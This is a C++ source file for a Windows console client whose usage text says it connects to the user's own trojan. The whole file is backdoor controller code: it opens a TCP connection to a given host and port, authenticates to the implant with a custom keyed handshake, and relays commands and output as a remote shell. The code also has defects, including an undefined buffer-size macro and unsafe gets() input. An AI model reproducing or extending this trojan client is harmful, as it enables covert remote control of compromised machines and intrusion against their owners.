 // ownshell.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#pragma comment(lib,"Ws2_32")

#define OWN_KEY		346				//自己的密钥
#define MAXDATASIZE 1024				//每次可以接收的最大字节 
#define OWN_SIGN	"scuclark\n"

//自定义握手协议结构体
typedef struct conninfo 
{
	int go;
	int come;
	char a;
} * Pconninfo;

BOOL connestab(SOCKET server);
int AverageRandom(int min,int max);

int main(int argc, char *argv[]) 
{ 
	SOCKET sockfd;
	char * recvbufp, * sendbufp;
	int numbytes, state,readn=0,sendn=0,recvn=0; 
	int istty;
	fd_set FdRead, ding;
	char buf[OWNDATASIZE],bufin[OWNDATASIZE]; 
	struct sockaddr_in their_addr;	/* 对方的地址端口信息	 */ 
	if (argc != 3) 
	{ 
		//需要有服务端ip参数
		fprintf(stderr,"用法: ownshell.exe ip port\n用来连接自己的木马\nPower by 雪山"); 
		exit(1); 
	} 
	
	printf("连接到 %s 端口: %s .....\n",argv[1],argv[2]);

	WSADATA ws;
	WSAStartup(MAKEWORD(2,2),&ws);	//初始化Windows Socket Dll
	
	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	
	//连接对方
	their_addr.sin_family = AF_INET;											/* 协议类型是INET	*/ 
	their_addr.sin_port = htons((unsigned short)atol(argv[2]));					/* 连接对方830端口	*/ 
	their_addr.sin_addr.s_addr = inet_addr(argv[1]);							/* 连接对方的IP	*/ 
	state=connect(sockfd, (struct sockaddr *)&their_addr,sizeof(struct sockaddr));
	
	if(state!=0)
	{
		printf("连接 %s:%s失败!!\n",argv[1],argv[2]);
		WSACleanup();
		exit(1);
	}else
		system("cls");

	printf("正在与 %s:%s 进行握手......\n",argv[1],argv[2]);
	if(connestab(sockfd)==FALSE){
		printf("与 %s:%s 握手失败!!\n",argv[1],argv[2]);
		closesocket(sockfd);
		WSACleanup();
		exit(1);
	}
	printf("恭喜,与 %s:%s 握手成功!!\n",argv[1],argv[2]);
	
	struct timeval TimeOut; 
	TimeOut.tv_sec=0; 
	TimeOut.tv_usec=1000; 
	FD_ZERO(&ding); 
	FD_ZERO(&FdRead);
	FD_SET (sockfd, &ding);

	while (FD_ISSET(sockfd,&ding))
	{
		//赋初始值
		FdRead=ding;

		//超时或错误
		int Er=select(sockfd+1, &FdRead, 0, 0, &TimeOut);
		if( (Er==SOCKET_ERROR))
		{
			printf("select socket err!\n",Er);
			FD_CLR(sockfd,&FdRead);
			FD_CLR (sockfd, &ding);
		}
		if( FD_ISSET(sockfd,&FdRead))
		{
				numbytes=recv(sockfd, buf, sizeof(buf), 0);
				if(numbytes == SOCKET_ERROR || numbytes==0)
				{
					FD_CLR (sockfd, &ding);
				}		//可读但已经关闭连接
				else
				{
					recvn=numbytes;
					buf[numbytes] = '\0';
					recvbufp= buf;
				}
		}
		
		if(sendn)goto print;	//检查是否有数据还未发送
		
		if (kbhit()) //检查终端上是否有数据,有则读进来
		{
			gets(bufin);
			strcat(bufin, "\n");
			readn = strlen(bufin);
			if(readn>0)
			{
				sendn=readn;
				bufin[readn]='\0';
				sendbufp=bufin;
			}
		}	

print:
		
		if(recvn)
		{	
			int rr= write (1, recvbufp, recvn);
			recvbufp+=rr;
			recvn-=rr;
		}

		if(sendn)
		{
			readn=send(sockfd,sendbufp,sendn,0);
			sendbufp+=readn;
			sendn-=readn;
		}
		if(recvn || sendn )goto print;
		Sleep(10);
		
	}
	printf("从 %s 断开连接!!\n",argv[1]);
	closesocket(sockfd); 
	WSACleanup();
	return 0; 
} 

BOOL connestab(SOCKET server)
{
	int count;
	conninfo info;
	Pconninfo infop=&info;
	char buf[256],cmd[5];
	srand( (unsigned)time( NULL ) );
	info.a='\n';
	send(server,OWN_SIGN,strlen(OWN_SIGN),NULL);
	count=0;
	while(count<256)
		{ 
			if(recv(server,cmd,1,0)==SOCKET_ERROR)
			{
				closesocket(server); 
				return FALSE;
			}
			buf[count]=cmd[0]; 
			if(cmd[0]==0xa || cmd[0]==0xd) 
			{ 
				buf[count]=0; 
				break; 
			} 
			count++; 
		} 
	if( ((Pconninfo)buf) ->come!=68)return FALSE;
	info.come=((Pconninfo)buf)->go%OWN_KEY;
	info.go=AverageRandom(100000,999999);
	send(server,(char *)infop,sizeof(info)-3,NULL);
	count=0;
	while(count<256)
		{ 
			if(recv(server,cmd,1,0)==SOCKET_ERROR)
			{
				closesocket(server); 
				return FALSE;
			}
			buf[count]=cmd[0]; 
			if(cmd[0]==0xa || cmd[0]==0xd) 
			{ 
				buf[count]=0; 
				break; 
			} 
			count++; 
		} 
	if( ((Pconninfo)buf)->come!=info.go%OWN_KEY && ((Pconninfo)buf)->go!='o'+'k')
		return FALSE;
	return TRUE;
}

int AverageRandom(int min,int max)
        {
        int minInteger = (int)(min*10000);
        int maxInteger = (int)(max*10000);
        int randInteger = rand()*rand();
        int diffInteger = maxInteger - minInteger;
        int resultInteger = randInteger % diffInteger + minInteger;
        return resultInteger/10000;
        }														//产生随机数
